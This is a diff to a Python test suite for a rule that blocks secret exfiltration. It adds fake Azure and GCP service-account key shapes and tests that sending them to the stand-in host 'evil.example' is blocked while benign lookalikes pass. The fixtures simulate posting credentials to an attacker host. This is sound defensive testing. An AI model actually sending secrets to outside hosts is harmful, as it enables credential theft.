@@ -49,6 +49,17 @@ FAKE_ANTHROPIC = "sk-ant-" + "api03-" + "EXAMPLE0123456789abcdefABCDEF0123456789
 FAKE_OPENAI_PROJ = "sk-proj-" + "EXAMPLE0123456789abcdefABCDEF0123456789"  # noqa: S105
 FAKE_GITLAB = "glpat-" + "EXAMPLE0123456789abcdefABCDE"  # noqa: S105
 FAKE_STRIPE_TEST = "sk" + "_test_" + "EXAMPLE0123456789abcdef99"  # noqa: S105
+# Azure / GCP service-account key shapes (issue #93). Built via `+` so
+# push-protection / gitleaks does not flag a contiguous secret-shaped literal;
+# the runtime value still matches the new regexes, the source stays clean.
+FAKE_AZURE_STORAGE_KEY = (
+    "AccountKey=" + "EXAMPLE" + "0123456789abcdefghijABCDEFGHIJklmnopqrstuvwxyz"
+)  # noqa: S105
+FAKE_AZURE_SB_KEY = (
+    "SharedAccessKey=" + "EXAMPLE" + "0123456789abcdefghijABCDEFGHIJklmnopqrstuvwxyz"
+)  # noqa: S105
+FAKE_GCP_SA_JSON = '"type": ' + '"service_account"'  # noqa: S105 — GCP SA key JSON marker
+FAKE_GCP_SA_EMAIL = "example" + "@my" + "-project" + ".iam.gserviceaccount.com"  # noqa: S105
 
 NEW_CREDENTIALS = [
     FAKE_JWT,
@@ -144,6 +155,49 @@ def test_expanded_credentials_block_on_exfiltration(secret):
 def test_benign_lookalikes_do_not_secret_block_on_exfiltration(text):
     # Strings that resemble but are NOT strong credentials must not trigger a
     # secret-exfiltration BLOCK — no over-blocking benign external sends.
+    action = _action(
+        ActionType.network_request,
+        target="https://example.com/c",
+        dest="https://example.com/c",
+    )
+    result = RULE.evaluate(action, _ctx(url="https://example.com/c", body=f"value: {text}"))
+    assert ReasonCode.secret_exfiltration not in result.reason_codes
+
+
+# --- Issue #93: Azure + GCP service-account key shapes ----------------------
+AZURE_GCP_CREDENTIALS = [
+    FAKE_AZURE_STORAGE_KEY,
+    FAKE_AZURE_SB_KEY,
+    FAKE_GCP_SA_JSON,
+    FAKE_GCP_SA_EMAIL,
+]
+# Strings that resemble Azure / GCP material but are NOT secrets — must not block.
+AZURE_GCP_BENIGN = [
+    "AccountName=mystorageaccount",  # Azure account name, no AccountKey present
+    '{"type": "user"}',  # a non-service-account JSON type field
+    "dev@example.com",  # ordinary email, not a GCP SA address
+    "Endpoint=sb://my.servicebus.windows.net/",  # SB endpoint, no SharedAccessKey
+]
+
+
+@pytest.mark.parametrize("secret", AZURE_GCP_CREDENTIALS)
+def test_azure_gcp_credentials_block_on_exfiltration(secret):
+    # Issue #93: newly-covered Azure / GCP service-account shapes sent to an
+    # external destination → BLOCK (secret_exfiltration).
+    action = _action(
+        ActionType.network_request,
+        target="https://evil.example/c",
+        dest="https://evil.example/c",
+    )
+    result = RULE.evaluate(action, _ctx(url="https://evil.example/c", body=f"data: {secret}"))
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.secret_exfiltration in result.reason_codes
+
+
+@pytest.mark.parametrize("text", AZURE_GCP_BENIGN)
+def test_azure_gcp_benign_do_not_block_on_exfiltration(text):
+    # Issue #93 precision guards: Azure account names, non-SA JSON, ordinary
+    # emails, and SB endpoints without a key must not trigger a secret BLOCK.
     action = _action(
         ActionType.network_request,
         target="https://example.com/c",
